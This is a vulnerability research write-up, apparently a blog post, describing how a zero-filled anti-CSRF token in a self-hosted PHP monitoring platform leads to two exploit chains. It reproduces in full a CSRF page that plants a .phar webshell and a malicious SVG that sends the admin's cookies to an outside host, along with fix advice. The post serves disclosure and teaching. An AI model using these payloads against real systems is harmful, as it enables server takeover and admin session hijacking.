A Wall of Zeroes: How One Broken Token Became Two High CVEs

One broken anti-CSRF check, two full exploit chains, and a way of thinking you can borrow for your own hunting.

by author one and author two

High CSRF bypass RCE Stored XSS

01The Hook

Not every good bug is complicated. Some of them are just plain broken in a way that makes you stop and stare at the screen for a second. This is one of those.

We were poking at a self-hosted monitoring platform, the kind of thing that sits quietly inside a corporate network with visibility into every server it watches. It had a file upload feature behind an "anti-CSRF" token, so we tried the laziest attack we could think of: we replaced the token with a bunch of zeroes and sent it anyway. The server accepted it.

That one weak check was the opening for everything that followed. From it we built two separate exploit chains, both off the exact same root cause:

  1. CSRF bypass, then a .phar upload, ending in Remote Code Execution (). Full server takeover.
  2. CSRF bypass, then a malicious SVG upload, ending in Stored XSS and admin session hijack (). Full account takeover.

One broken token, two ways to own the box. Here's how we found it, and more usefully, how you can find things like it yourself.

02The Target

is a monitoring platform. It's a large PHP application that runs on-premises and keeps an eye on an organization's infrastructure: servers, network gear, alerting rules, all of it. Software like this makes a great target for two reasons.

First, it's privileged. A monitoring server needs to reach deep into the network to do its job, so if you pop the monitor you usually get a nice pivot point into everything around it.

Second, it's old-school. Big, feature-heavy PHP apps tend to grow their own security machinery over the years: hand-rolled CSRF tokens, custom upload filters, blacklists. Custom security code is where the bugs hide, because sooner or later everyone reinvents a wheel that isn't quite round.

The feature we ended up living in was the File Manager (the Attachments / Plugin tab), which lets an admin upload files to the server. Any time an app lets you write a file to disk, that's worth a close look.

03The Methodology (The "How")

This is the part actually worth your time, so we'll slow down. Everything after this is just execution.

Lesson 1: Uploads plus a custom token means go poke at it

When we map out an app, we keep a running list of the features where a small mistake has an outsized payoff. File uploads sit near the top of that list, right up there with auth and anything that renders user input. So the moment we saw a File Manager, we knew where the afternoon was going.

We uploaded a plain, boring file and captured the request in Burp. That's the first thing to do with any upload: watch a normal request go through before you try to break anything. You can't cheat the rules until you know what they are.

Trimmed down, the request looked like this:

Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

Two things stood out right away. The hash and hash2 fields were obviously a home-grown anti-CSRF token scheme. And the request was authenticated purely by the PHPSESSID cookie, nothing else.

That pairing is a big red flag. Cookie-based auth is exactly what CSRF feeds on, and the only thing standing between us and a forged cross-site request was those two hash values. So the whole thing came down to a single question: does the server actually check them?

Lesson 2: A token being present doesn't mean it's being checked

This is the mindset we'd most like you to take away. Developers love to drop a token onto a form and call it CSRF-protected. But a token only protects anything if the server does three things: generates it unpredictably, ties it to your session, and rejects the request when the value is wrong or missing.

Plenty of custom implementations get the first two right and completely fumble the third. They write if (isset($hash)) where they meant if ($hash === $expected). They compare against an empty string. They pass on any value that's simply truthy. The token looks legit, but it's a bouncer who checks that you're holding a ticket without ever reading it.

So we tested it in the dumbest way available. No leaking the real token, no reversing the algorithm. We just filled both fields with zeroes:

the ten-second testpayload
hash  = 00000000000000000000000000000000
hash2 = 00000000000000000000000000000000

We sent it, and the upload went through.

So the check wasn't really doing anything. The server was happy to accept a static value that any attacker can guess, which means you don't need to know a single thing about the victim's session to forge a request it'll trust. CSRF was fully back in play.

Worth internalizing: any time you run into a custom token, try the cheap stuff before anything clever. Remove it, blank it, zero it, reuse yesterday's, drop in another user's. You'll be surprised how often one of those just works.

Lesson 3: A CSRF bypass is a capability, not the finish line

A lot of people would stop here, write up "CSRF on file upload," and file a medium. We think that sells it short. A CSRF bypass on an upload endpoint isn't really a vulnerability on its own, it's a capability: it lets us make a logged-in admin's browser write an arbitrary file to the server just by getting them to open a page.

Which turns the interesting question into "what file do we write?" And that's where the same root cause split into two very different, very unpleasant chains. This is the other half of the method: once you've got a write primitive, figure out what the upload filter actually blocks, then step around it.

04The Exploitation (The "Proof")

Chain 1: .phar upload to remote code execution ()

The upload filter blocked .php. Decent instinct from the developers, but it was a blacklist, not an allowlist. A blacklist is a promise to remember every dangerous thing forever, and nobody ever does.

PHP will execute more than just .php. Depending on the server config, .phar, .phtml, .php5, .php7 and a few others all get interpreted too. The blacklist forgot about .phar. We didn't.

So we built a CSRF page that forges the upload with our zeroed token and drops a .phar webshell into the web-accessible plugin directory:

csrf-rce.htmlhtml + js
<html>
<body>
<script>
  // webshell code
  var fileContent = `<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die;}?>`;
  var blob = new Blob([fileContent], { type: "application/octet-stream" });
  var file = new File([blob], "webshell.phar", { type: "application/octet-stream" });

  var formData = new FormData();
  formData.append("umask", "509");
  formData.append("file", file);
  formData.append("decompress_sent", "1");
  formData.append("upload_file_or_zip", "1");
  formData.append("go", "Go");
  formData.append("real_directory", "/var/www/html//attachment/plugin");
  formData.append("directory", "attachment/plugin");

  // The anti-CSRF tokens are never actually validated, so we send zeroes.
  formData.append("hash", "00000000000000000000000000000000");
  formData.append("hash2", "00000000000000000000000000000000");

  fetch("http:////index.php?sec=gservers&sec2=godmode/servers/plugin&filemanager=1&id_plugin=0&tab=Attachments", {
    method: "POST",
    body: formData,
    credentials: "include"
  });
</script>
</body>
</html>

Why it works, piece by piece:

  • credentials: "include" tells the browser to attach the victim's PHPSESSID cookie to a cross-origin request, so the server sees a fully authenticated admin upload.
  • The zeroed hash and hash2 sail straight past the broken validation, no session knowledge needed.
  • webshell.phar gets by a filter that only knows to be scared of .php.
  • The file lands in a directory the web server is happy to execute rather than just serve.

Now we host the page, get an authenticated admin to click a link (a forum post, a phishing email, a comment on their own dashboard, whatever fits), and their browser quietly plants the shell for us. Then we just visit it:

trigger the shellbash
curl "http:////attachment/plugin/webshell.phar?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

Code execution, on a monitoring server. That's the ball game.

Chain 2: SVG upload to stored XSS and session hijack ()

Say PHP execution had actually been locked down in that upload directory. Are we done? Not really, because the same broken token hands us a second path that doesn't need code execution at all.

The File Manager accepts SVG uploads. Here's the part people forget: an SVG isn't really an image, it's an XML document that a browser will run JavaScript out of. If the server stores your SVG and later serves it inline, any <script> inside it runs in the application's origin. That's stored XSS, straight out of the textbook.

Our SVG payload:

payload.svgxml
<?xml version="1.0" encoding="utf-8"?>
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
     fetch('https:///?cookies=' + btoa(document.cookie));
     alert('XSS');
   </script>
</svg>

We deliver it with the same zeroed-token CSRF idea, this time aimed at the File Manager's setup endpoint. The page writes the SVG into the images directory, then after a few seconds it points the admin's own browser at the stored file so the payload fires:

csrf-xss.htmlhtml + js
<!DOCTYPE html>
<html>
<head>
    <title>CSRF POC</title>
</head>
<body>
    <script>
    // xss payload
        const svgContent = `<?xml version="1.0" encoding="utf-8"?>
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
     fetch('https:///?cookies=' + btoa(document.cookie));
     alert('XSS');
   <\/script>
</svg>`;

        const base = 'http:///';
        const uploadedFileUrl = base + '/images/xss-poc.svg';

        const formData = new FormData();
        formData.append('directory', 'images');
        formData.append('real_directory', '/var/www/html//images');
        formData.append('hash', '00000000000000000000000000000000');
        formData.append('hash2', '00000000000000000000000000000000');
        formData.append('umask', '');
        formData.append('upload_file', '1');
        formData.append('go', 'Go');
        formData.append('file', new Blob([svgContent], {type: 'image/svg+xml'}), 'xss-poc.svg');

        // Fire upload (ignore response/errors)
        fetch(base + '/index.php?sec=gsetup&sec2=godmode/setup/file_manager', {
            method: 'POST',
            body: formData,
            credentials: 'include'
        }).catch(() => {});

        // After 5 seconds, load the uploaded file so the stored XSS fires
        setTimeout(() => {
            window.location.href = uploadedFileUrl;
        }, 5000);
    </script>
</body>
</html>

Why it works:

  • The upload does no content inspection on the SVG at all. Nothing strips <script>, nothing scrubs onload or onerror, nothing filters javascript:.
  • When the stored SVG gets served inline (its Content-Type renders in the browser instead of downloading), the embedded script runs as though the app itself wrote it.
  • Running in 's origin, our script reads document.cookie and beacons the admin's session token back to us.

Drop that stolen PHPSESSID into our own browser and now we're the admin. And because the payload is stored, it fires again for every user who views the file, so the blast radius keeps growing on its own until someone manually deletes it.

05The Impact

Both chains start from one admin clicking one link. No credentials, no prior access, nothing beyond a single page visit.

From Chain 1 ():

  • Read any file on the server: database credentials, config secrets, private keys.
  • Modify application data, plant persistent backdoors, quietly tamper with monitoring rules to blind the defenders.
  • Destroy data or take the platform offline.
  • Pivot off the monitoring box into the rest of the network it can reach.

From Chain 2 ():

  • Full impersonation of the admin, inheriting their entire privilege set.
  • Complete control of 's configuration, monitored infrastructure data, alert rules, and user management.
  • Persistence, since every later viewer of the SVG gets caught in it too.

For a platform whose whole job is watching the network for trouble, it doesn't get much worse. The watcher ends up being the intruder's own set of eyes.

06The Fix & Takeaways

How it should be fixed

The root cause is a single broken check, so fix that first and then harden the sinks around it:

  • Fix the CSRF check for real. Generate cryptographically random, session-bound tokens and validate them with a strict, constant-time comparison. Reject static, null-padded, blank, or malformed values instead of waving them through.
  • Allowlist file types instead of blacklisting. Permit a known-good set of extensions and verify the magic bytes, not just the name. Everything executable (.phar, .phtml, .php5, .php7, and the rest) is blocked simply by not being on the list.
  • Neutralize the upload directory. Turn off script interpretation there via .htaccess or server config, and serve user files with Content-Disposition: attachment, Content-Type: application/octet-stream, and X-Content-Type-Options: nosniff so nothing renders or runs inline.
  • Sanitize SVGs, or just don't accept them. Strip <script>, event handlers, <foreignObject>, and javascript: URIs.
  • Harden the cookie. Set HttpOnly (which kills the document.cookie theft) and SameSite=Strict or Lax (which adds a second, browser-enforced layer against CSRF).

It's worth noticing how many independent layers all had to fail at once for this to work: the token, the extension filter, the execution policy, the content-type handling, the cookie flags. Defense in depth isn't paranoia, it's the difference between a near miss and a headline.

Three things to take with you

  1. Test the token you're being told to trust. Custom anti-CSRF, anti-replay, and signature checks are very often just present rather than enforced. Before you reach for anything sophisticated, try the cheap attacks: delete it, blank it, zero it, reuse it, swap it. The zeroes that kicked off this whole story took about ten seconds to try.
  2. A write primitive is a launchpad, so enumerate the filter. Once you can put a file on a server, don't stop at "arbitrary file upload." Ask what you can actually write. Blacklists leak (.php becomes .phar), image parsers execute (SVG becomes XSS). The severity lives in the payload you get away with, not in the upload itself.
  3. Chain it, then chain it again. We got two critical findings out of one root cause because we kept asking "what if the next layer holds?" instead of stopping at the first win. Even once RCE looked likely, we still went and found the XSS path. Assume each defense might survive and go find the exploit that gets through anyway. That's what takes a report from good to undeniable.
